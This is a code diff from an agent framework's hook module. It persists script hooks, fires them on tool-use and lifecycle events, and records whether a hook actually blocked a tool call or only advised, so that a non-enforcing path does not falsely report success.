+        # hook fired 3× and the file still held its content. Worse than inert: it reported success.
+        #
+        # `advisory` is deliberately the same word as `ENFORCEMENT_ADVISORY`: one vocabulary, two
+        # levels. `enforcement` says whether this hook CAN block; this says whether the last fire
+        # DID. Both are needed — a bound, enforcing hook still reaches this branch when an ACP
+        # `EVENT_TOOL_CALL` frame arrives already auto-approved.
+        _status = "blocked" if enforced else "advisory"
+    elif result.success:
+        # Honest "started ≠ succeeded" (T7): a fire-and-forget action (run-prompt/
+        # run-workflow/invoke-agent) only LAUNCHED a background turn — record
+        # "launched" so the lifecycle-trigger badge doesn't overstate it as a
+        # verified success, matching the schedule path's run-record status.
+        # `queued` is carried through for the same reason and is weaker still: under
+        # `on_overlap: queue` nothing started at all (WV-14), so folding it into "ok"
+        # would report work that has not begun as work that finished.
+        _status = result.outcome if result.outcome in ("launched", "queued") else "ok"
+    elif result.error and "Timed out" in result.error:
+        _status = "timeout"
+    else:
+        _status = "error"
+    _record(_status)
+
+    # `auto_with_undo`: persist the provider's reversal handle + passively notify. Only for
+    # an action that actually did something — a failed action has nothing to take back.
+    if route.records_reversal and result.success:
+        record_reversal(
+            route,
+            result,
+            label=hook.name or hook.provider,
+            refs={"hook": hook.id, "provider": hook.provider},
+        )
+
+    # A provider that populated the §2 envelope on a failed result surfaces its
+    # WHAT/WHY/FIX text as the error (else the plain provider error string).
+    error_text = result.agent_error.render() if result.agent_error is not None else result.error
+    return ScriptHookResult(
+        hook_id=hook.id,
+        hook_name=hook.name,
+        event=hook.event,
+        stdout=result.stdout,
+        stderr=result.stderr,
+        exit_code=result.exit_code if result.exit_code is not None else -1,
+        error=error_text,
+        duration_ms=result.duration_ms,
+    )
+
+
+# ── Script Hook Store (persistence) ──
+
+_HOOKS_FILE = "hooks.json"
+
+
+class ScriptHookStore:
+    """Persist script hooks to ~/.personalclaw/hooks.json."""
+
+    def __init__(self, config_dir: Path | None = None):
+        from personalclaw.config.loader import config_dir as _cfg_dir
+
+        self._dir = config_dir or _cfg_dir()
+        self._path = self._dir / _HOOKS_FILE
+        self._hooks: dict[str, ScriptHook] = {}
+        self._load()
+
+    def _load(self) -> None:
+        if not self._path.exists():
+            return
+        try:
+            data = json.loads(self._path.read_text(encoding="utf-8"))
+            for h in data.get("hooks", []):
+                hook = ScriptHook.from_dict(h)
+                self._hooks[hook.id] = hook
+        except (json.JSONDecodeError, OSError) as exc:
+            logger.warning("Failed to load hooks: %s", exc)
+
+    def _save(self) -> None:
+        data = {"hooks": [h.to_dict() for h in self._hooks.values()]}
+        atomic_write(self._path, json.dumps(data, indent=2))
+
+    def list_all(self) -> list[ScriptHook]:
+        return list(self._hooks.values())
+
+    def get(self, hook_id: str) -> ScriptHook | None:
+        return self._hooks.get(hook_id)
+
+    def create(self, data: dict) -> ScriptHook:
+        hook = ScriptHook.from_dict(data)
+        if not hook.id:
+            hook.id = str(uuid.uuid4())[:8]
+        self._hooks[hook.id] = hook
+        self._save()
+        return hook
+
+    def update(self, hook_id: str, data: dict) -> ScriptHook | None:
+        hook = self._hooks.get(hook_id)
+        if not hook:
+            return None
+        if "event" in data and data["event"] not in HOOK_EVENTS:
+            raise ValueError(f"invalid event: {data['event']}")
+        if "timeout" in data:
+            t = data["timeout"]
+            if not isinstance(t, int) or not (1 <= t <= 300):
+                raise ValueError("timeout must be an integer between 1 and 300")
+        if "provider_config" in data and not isinstance(data["provider_config"], dict):
+            raise ValueError("provider_config must be an object")
+        for k in ("name", "event", "matcher", "provider", "provider_config", "timeout", "enabled"):
+            if k in data:
+                setattr(hook, k, data[k])
+        self._save()
+        return hook
+
+    def delete(self, hook_id: str) -> bool:
+        if hook_id in self._hooks:
+            del self._hooks[hook_id]
+            self._save()
+            return True
+        return False
+
+    def toggle(self, hook_id: str) -> ScriptHook | None:
+        hook = self._hooks.get(hook_id)
+        if not hook:
+            return None
+        hook.enabled = not hook.enabled
+        self._save()
+        return hook
+
+    async def fire(
+        self,
+        event: str,
+        context: str = "",
+        tool_name: str = "",
+        tool_input: dict | None = None,
+        tool_response: dict | None = None,
+        subagent_id: str = "",
+        parent_session_key: str = "",
+        agent_role: str = "",
+    ) -> list[ScriptHookResult]:
+        """Fire all enabled hooks matching the given event. Returns results.
+
+        For PreToolUse/PostToolUse, matcher filters by tool name.
+        For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.
+
+        ``subagent_id``/``parent_session_key``/``agent_role`` (E11-P3) attribute a
+        fire to the subagent that triggered it; they ride the event payload and
+        are absent for top-level fires.
+
+        **This path never enforces (G89).** Its results are returned but no caller gates on
+        them — :func:`fire_tool_hooks`, ``subagent`` and ``llm_helpers`` reach it when the tool is
+        already running — so an exit 2 here records ``advisory``, not ``blocked``.
+        Use :meth:`fire_for_ids` for the gating seam.
+        """
+        return await self._fire(
+            event,
+            context=context,
+            tool_name=tool_name,
+            tool_input=tool_input,
+            tool_response=tool_response,
+            hook_ids=None,
+            subagent_id=subagent_id,
+            parent_session_key=parent_session_key,
+            agent_role=agent_role,
+        )
+
+    async def fire_for_ids(
+        self,
+        event: str,
+        hook_ids: "set[str] | list[str] | None",
+        context: str = "",
+        tool_name: str = "",
+        tool_input: dict | None = None,
+        tool_response: dict | None = None,
+        depth: int = 0,
+        subagent_id: str = "",
+        parent_session_key: str = "",
+        agent_role: str = "",
+    ) -> list[ScriptHookResult]:
+        """Fire only the hooks in ``hook_ids`` that match ``event`` (agent-scoped).
+
+        The agent-scoped firing primitive (E3): an agent references a subset of the
+        hook library and only those hooks fire for it — global hooks are NOT run.
+        ``hook_ids=None`` is treated as "no scoped hooks" → fires nothing (use
+        :meth:`fire` for the global set). An empty collection likewise fires nothing.
+        Matcher/enabled/event filtering is identical to :meth:`fire`.
+
+        ``depth`` is the recursion depth of the originating agent (0 = the user's
+        top-level agent); it is injected into the event payload as
+        ``__hook_depth`` so the ``invoke-agent`` action can bound spawn recursion.
+
+        ``subagent_id``/``parent_session_key``/``agent_role`` (E11-P3) attribute the
+        fire to a subagent; additive optional payload fields, absent at top level.
+
+        **This is the gating seam, and that is why it passes ``enforced=True`` (G89).** Both of
+        its callers — ``chat_runner._fire`` and ``provider_bridge``'s ``hook_fire`` — turn an
+        exit-2 result into the ``BLOCKED:`` sentinel that rejects the tool, so a block recorded
+        from here really happened. A future caller that ignores the results would make the status
+        a lie again; ``test_hook_advisory_status`` pins the two that exist.
+        """
+        if not hook_ids:
+            return []
+        allow = set(hook_ids)
+        return await self._fire(
+            event,
+            context=context,
+            tool_name=tool_name,
+            tool_input=tool_input,
+            tool_response=tool_response,
+            hook_ids=allow,
+            depth=depth,
+            enforced=True,
+            subagent_id=subagent_id,
+            parent_session_key=parent_session_key,
+            agent_role=agent_role,
+        )
+
+    async def _fire(
+        self,
+        event: str,
+        *,
+        context: str = "",
+        tool_name: str = "",
+        tool_input: dict | None = None,
+        tool_response: dict | None = None,
+        hook_ids: "set[str] | None" = None,
+        depth: int = 0,
+        enforced: bool = False,
+        subagent_id: str = "",
+        parent_session_key: str = "",
+        agent_role: str = "",
+    ) -> list[ScriptHookResult]:
+        """Shared firing core. ``hook_ids`` (when not None) restricts firing to
+        that allow-set of hook ids; None fires every enabled matching hook.
+
+        ``enforced`` rides down to :func:`run_script_hook` so an exit 2 is recorded as a real
+        ``blocked`` only on the gating seam (G89). It is ANDed with
+        :data:`BLOCKING_EVENTS` here: ``PreToolUse`` is the one event with a block seam at all, so
+        a ``Stop`` hook that exits 2 records ``advisory`` no matter who fired it — there was
+        nothing for it to block."""
+        import os
+
+        results = []
+        # Build base hook event
+        hook_event: dict = {"hook_event_name": event, "cwd": os.getcwd()}
+        # Recursion depth for invoke-agent's spawn bound (E3-P3). Reserved key.
+        hook_event["__hook_depth"] = depth
+        # Subagent attribution (E11-P3): present only when a subagent fires, so a
+        # top-level chat fire's payload omits them. Hook scripts read these to
+        # attribute a tool call to the subagent that made it.
+        if subagent_id:
+            hook_event["subagent_id"] = subagent_id
+        if parent_session_key:
+            hook_event["parent_session_key"] = parent_session_key
+        if agent_role:
+            hook_event["agent_role"] = agent_role
+        if event == HOOK_EVENT_USER_PROMPT_SUBMIT and context:
+            hook_event["prompt"] = context
+        if tool_name:
+            hook_event["tool_name"] = tool_name
+        if tool_input is not None:
+            hook_event["tool_input"] = tool_input
+        if tool_response is not None:
+            hook_event["tool_response"] = tool_response
+
+        for hook in list(self._hooks.values()):
+            if not hook.enabled or hook.event != event:
+                continue
+            if hook_ids is not None and hook.id not in hook_ids:
+                continue  # agent-scoped: only fire referenced hooks
+            # Matcher filtering: for tool hooks, match tool name; for others, match context
+            if hook.matcher:
+                if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
+                    if not _tool_matches(hook.matcher, tool_name):
+                        continue
+                elif context and not fnmatch.fnmatch(context.lower(), hook.matcher.lower()):
+                    continue
+            result = await run_script_hook(
+                hook,
+                context,
+                hook_event,
+                enforced=enforced and event in BLOCKING_EVENTS,
+            )
+            results.append(result)
+            logger.info(
+                "Hook %s (%s): %s in %dms (exit=%d)",
+                hook.name,
+                event,
+                hook.last_status,
+                result.duration_ms,
+                result.exit_code,
+            )
+        hooks_snapshot = [h.to_dict() for h in self._hooks.values()]
+        await asyncio.to_thread(self._save_snapshot, hooks_snapshot)
+        return results
+
+    def _save_snapshot(self, hooks_data: list[dict]) -> None:
+        """Thread-safe save using pre-captured hook snapshot."""
+        data = {"hooks": hooks_data}
+        atomic_write(self._path, json.dumps(data, indent=2))
+
+
+# -- Global script hook store accessor --
+# Set by dashboard server.py / handlers.py when the store is initialized.
+# Allows any module (llm_helpers, subagent) to fire script hooks
+# without needing a reference to DashboardState.
+
+_global_script_hook_store: ScriptHookStore | None = None
+
+
+def set_global_hook_store(store: ScriptHookStore) -> None:
+    """Register the global script hook store."""
+    global _global_script_hook_store
+    _global_script_hook_store = store
+
+
+def get_global_hook_store() -> ScriptHookStore | None:
+    """Get the global script hook store, or None if not initialized."""
+    return _global_script_hook_store
+
+
+async def fire_tool_hooks(
+    hook_store: ScriptHookStore | None,
+    event_title: str,
+    event_tool_input: str | None = None,
+    *,
+    subagent_id: str = "",
+    parent_session_key: str = "",
+    agent_role: str = "",
+) -> None:
+    """Fire PreToolUse hooks for an EVENT_TOOL_CALL event.
+
+    PostToolUse is NOT fired here because EVENT_TOOL_CALL is a notification
+    that the tool is starting - the tool hasn't completed yet. PostToolUse
+    should be fired on EVENT_TOOL_RESULT when available.
+
+    Note: For EVENT_TOOL_CALL, hooks are informational only. The tool is
+    already running (auto-approved by ACP agent), so hook results cannot
+    block execution. Hook scripts can log, audit, or trigger side effects.
+
+    A hook that exits 2 here therefore records ``last_status`` ``advisory``, never
+    ``blocked`` — measured on codex and claude-code alike, this seam reported a block while the
+    write it "blocked" landed on disk (G89). :meth:`ScriptHookStore.fire` owns that decision, so
+    this function stays a thin adapter.
+
+    ``subagent_id``/``parent_session_key``/``agent_role`` (E11-P3) attribute the
+    fire to the subagent that ran the tool; omitted for top-level tool calls.
+    """
+    if hook_store is None:
+        return
+    tool_name = event_title or ""
+    if tool_name.startswith("Running: "):
+        tool_name = tool_name[9:]
+    tool_input = None
+    if event_tool_input:
+        try:
+            tool_input = json.loads(event_tool_input)
+        except Exception:
+            pass
+    try:
+        await hook_store.fire(
+            HOOK_EVENT_PRE_TOOL_USE,
+            tool_name=tool_name,
+            tool_input=tool_input,
+            subagent_id=subagent_id,
+            parent_session_key=parent_session_key,
+            agent_role=agent_role,
+        )
+    except Exception:
+        logger.debug("PreToolUse hook error", exc_info=True)
